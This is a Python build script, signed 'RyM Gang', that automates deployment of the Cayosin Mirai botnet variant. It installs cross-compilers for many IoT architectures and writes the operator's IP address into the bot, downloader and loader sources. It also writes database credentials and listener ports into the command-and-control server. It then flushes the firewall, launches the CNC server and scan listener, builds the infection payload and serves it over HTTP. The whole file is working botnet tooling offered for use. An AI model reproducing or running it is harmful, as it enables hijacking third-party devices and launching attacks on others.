#Cayosin Auto-Builder by Tragedy
#Install and Set Up MySQL/Cayosin DB Beforehand
#I'm Not Rewriting The Entire Database To Work With The mysql.connector Module

import sys
import time
import subprocess
import warnings
import fileinput

if len(sys.argv) < 7:
	print("\x1b[31m[SYNTAX ERROR] Usage: python %s [IP] [CNCPORT] [BOTPORT] [SQLUSER] [SQLPASS] [SQLTABLE]\x1b[0m" % sys.argv[0])
	sys.exit()

hst = sys.argv[1]
cp = sys.argv[2]
bp = sys.argv[3]
sqlu = sys.argv[4]
sqlp = sys.argv[5]
sqlt = sys.argv[6]

def run(cmd):
	subprocess.call(cmd, shell=True)

print ("\x1b[1;36m[+] Welcome to the Cayosin Mirai Variant [+]")
print ("\x1b[1;36m[+] Simply Load All Cayosin Files Into /root/")
print ("\x1b[1;36m[+] No Need To Change Anything In Them")
raw_input ("\x1b[1;36m[+] When All Files Are Loaded, Press Enter to Start Building...")

print ("\x1b[1;36mC.M.V. - Auto-Build Process Initiated...")
time.sleep(2)

#Typesizes
print ("\x1b[1;36m[+] Changing Maximum File Descriptor Size...")
fdsize = open("/usr/include/bits/typesizes.h","r").readlines()
fdsizew = open("/usr/include/bits/typesizes.h","w").write("")
for line in fdsize:
    line = line.replace("1024","1000000")
    fdsizew = open("/usr/include/bits/typesizes.h","a").write(line)
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Maximum File Descriptor Size Changed Successfully...")
time.sleep(2)

#Depos
print ("\x1b[1;36m[+] Installing Packages and Dependencies...")
time.sleep(1)
run ("yum update -y; yum install epel-release -y; yum groupinstall 'Development Tools' -y; yum install gmp-devel -y; ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10; yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Packages/Dependencies Installed...")
print ("\x1b[1;36m[+] Preparing /usr/local/go...")
time.sleep(1)
run ("rm -rf /usr/local/go; wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz; sha256sum go1.10.3.linux-amd64.tar.gz; sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz; export PATH=$PATH:/usr/local/go/bin; source ~/.bash_profile; rm -rf go1.10.3.linux-amd64.tar.gz")
print ("\x1b[1;36m[+] Downloading and Unpacking Compilers - [This May Take A Minute]...")
run ("mkdir /etc/xcompile; cd /etc/xcompile; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2; wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2; wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2; wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2; tar -jxf cross-compiler-i586.tar.bz2; tar -jxf cross-compiler-m68k.tar.bz2; tar -jxf cross-compiler-mips.tar.bz2; tar -jxf cross-compiler-mipsel.tar.bz2; tar -jxf cross-compiler-powerpc.tar.bz2; tar -jxf cross-compiler-sh4.tar.bz2; tar -jxf cross-compiler-sparc.tar.bz2; tar -jxf cross-compiler-armv4l.tar.bz2; tar -jxf cross-compiler-armv5l.tar.bz2; tar -jxf cross-compiler-armv6l.tar.bz2; tar -jxf cross-compiler-armv7l.tar.bz2; rm -rf *.tar.bz2; mv cross-compiler-i586 i586; mv cross-compiler-m68k m68k; mv cross-compiler-mips mips; mv cross-compiler-mipsel mipsel; mv cross-compiler-powerpc powerpc; mv cross-compiler-sh4 sh4; mv cross-compiler-sparc sparc; mv cross-compiler-armv4l armv4l; mv cross-compiler-armv5l armv5l; mv cross-compiler-armv6l armv6l; mv cross-compiler-armv7l armv7l; cd /tmp; wget https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz -q; tar -xzf go1.8.3.linux-amd64.tar.gz; mv go /usr/local/go; cd ~/")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Compilers Ready...")

#Bot
print ("\x1b[1;36m[+] Preparing Cayosin Bot Files...")
time.sleep(2)
#dom_quest = raw_input("\x1b[1;36mDo You Use A Domain? y/n:\x1b[0m")
#if dom_quest.lower() == "y":
#    repl_dom = True
#else:
#    repl_dom = False
#
#if repl_dom == True:
#	 You Can Write The Rest If You Use A Domain For Mirai In 2019

#bot/includes.h
old1 = "SCANIP "
new1 = "#define SCANIP (int)inet_addr((const char*)\""+ hst +"\"\n"
x = fileinput.input(files="/root/bot/includes.h", inplace=1)
for line in x:
    if old1 in line:
        line = new1
    print line,
x.close()
old2 = "SERVIP "
new2 = "#define SERVIP (int)inet_addr((const char*)\""+ hst +"\"\n"
x = fileinput.input(files="/root/bot/includes.h", inplace=1)
for line in x:
    if old2 in line:
        line = new2
    print line,
x.close()
#cnc/main.go
old3 = "const DatabaseUser "
new3 = "const DatabaseUser string   = \""+ sqlu +"\"\n"
x = fileinput.input(files="/root/cnc/main.go", inplace=1)
for line in x:
    if old3 in line:
        line = new3
    print line,
x.close()
old4 = "const DatabasePass "
new4 = "const DatabasePass string   = \""+ sqlp +"\"\n"
x = fileinput.input(files="/root/cnc/main.go", inplace=1)
for line in x:
    if old4 in line:
        line = new4
    print line,
x.close()
old5 = "const DatabaseTable "
new5 = "const DatabaseTable string  = \""+ sqlt +"\"\n"
x = fileinput.input(files="/root/cnc/main.go", inplace=1)
for line in x:
    if old5 in line:
        line = new5
    print line,
x.close()
old6 = "Listen"
new6 = "    tel, err := net.Listen(\"tcp\", \""+ hst +":"+ cp +"\")\n"
x = fileinput.input(files="/root/cnc/main.go", inplace=1)
for line in x:
    if old6 in line:
        line = new6
    print line,
x.close()
#dlr/main.c
dlra = hst.split('.', 4)
addr1 = dlra[0]
addr2 = dlra[1]
addr3 = dlra[2]
addr4 = dlra[3]
old7 = "#define HTTP_SERVER "
new7 = "#define HTTP_SERVER utils_inet_addr("+ addr1 +","+ addr2 +","+ addr3 +","+ addr4 +")\n"
x = fileinput.input(files="/root/dlr/main.c", inplace=1)
for line in x:
    if old7 in line:
        line = new7
    print line,
x.close()
#/loader/src/main.c
old8 = "addrs[0] = "
new8 = "    addrs[0] = inet_addr(\""+ hst +"\");\n"
x = fileinput.input(files="/root/loader/src/main.c", inplace=1)
for line in x:
    if old8 in line:
        line = new8
    print line,
x.close()
old9 = "addrs[1] = "
new9 = "    addrs[1] = inet_addr(\""+ hst +"\");\n"
x = fileinput.input(files="/root/loader/src/main.c", inplace=1)
for line in x:
    if old9 in line:
        line = new9
    print line,
x.close()
old10 = "server_create"
new10 = "    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \""+ hst +"\", 80, \""+ hst +"\")) == NULL)\n"
x = fileinput.input(files="/root/loader/src/main.c", inplace=1)
for line in x:
    if old10 in line:
        line = new10
    print line,
x.close()
#scanListen.go
old11 = "Listen"
new11 = "    l, err := net.Listen(\"tcp\", \""+ hst +":1982\")\n"
x = fileinput.input(files="/root/scanListen.go", inplace=1)
for line in x:
    if old11 in line:
        line = new11
    print line,
x.close()

#build.sh
print ("\x1b[1;36m[+] Files Prepared, Building...")
time.sleep(2)
run ("cd ~/; chmod 0777 * -R; sh build.sh")
#cnc
print ("\x1b[1;36m[\x1b[1;33m!\x1b[1;36m] Screening CNC, Detach With CNTRL+A+D Afterwards To Continue...")
time.sleep(2)
run ("iptables -F; service iptables stop; screen ./cnc")
print ("\x1b[1;36m[\x1b[1;33m!\x1b[1;36m] Screening ScanListen, Detach With CNTRL+A+D Afterwards To Continue...")
run ("cd loader; screen ./scanListen")
print ("\x1b[1;36m[+] Building Payload...")
time.sleep(2)
run ("python build_payload.py; service httpd restart")
print ("\x1b[1;36m[+] Cayosin Built Successfully. [+]")
print ("\x1b[1;36m[RyM Gang]\x1b[0m")
exit(1)